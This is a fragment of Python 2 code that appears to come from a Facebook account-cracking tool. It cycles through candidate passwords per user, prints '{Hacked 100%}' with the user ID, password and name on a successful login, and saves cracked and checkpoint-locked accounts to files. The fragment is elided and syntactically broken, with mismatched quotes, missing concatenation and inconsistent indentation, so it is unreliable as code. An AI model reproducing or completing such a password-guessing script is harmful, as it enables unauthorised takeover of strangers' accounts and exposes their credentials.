	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m{Hacked 100%}  ' + k + c + user + '  》  ' + pass1+'>'+ b['name']"\n═════════════════════════════════════════════"
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[24Hours] ' + k + c + user + '  》  ' + pass1+'>'+ b['name']"\n═════════════════════════════════════════════'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{Hacked 100%}  ' + k + c + user + '  》  ' + pass2+'>'+ b['name']"\n═════════════════════════════════════════════"
 				        okb = open('save/successfull.txt', 'a')
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;97m[24Hours] ' + k + c + user + '  》  ' + pass2+'>'+ b['name']"\n═════════════════════════════════════════════'
 					        cps = open('save/checkpoint.txt', 'a')
 				            ...
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m{Hacked 100%}  ' + k + c + user + '  》  ' + pass3+'>'+ b['name']"\n═════════════════════════════════════════════"
 				                okb = open('save/successfull.txt', 'a')
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;97m[24Hours] ' + k + c + user + '  》  ' + pass3+'>'+ b['name']"\n═════════════════════════════════════════════'
 					                cps = open('save/checkpoint.txt', 'a')
 				                    ...
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m{Hacked 100%}  ' + k + c + user + '  》  ' + pass4+'>'+ b['name']"\n═════════════════════════════════════════════"
 				                        okb = open('save/successfull.txt', 'a')
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;97m[24Hours] ' + k + c + user + '  》  ' + pass4+'>'+ b['name']'\n═════════════════════════════════════════════'
 					                        cps = open('save/checkpoint.txt', 'a')
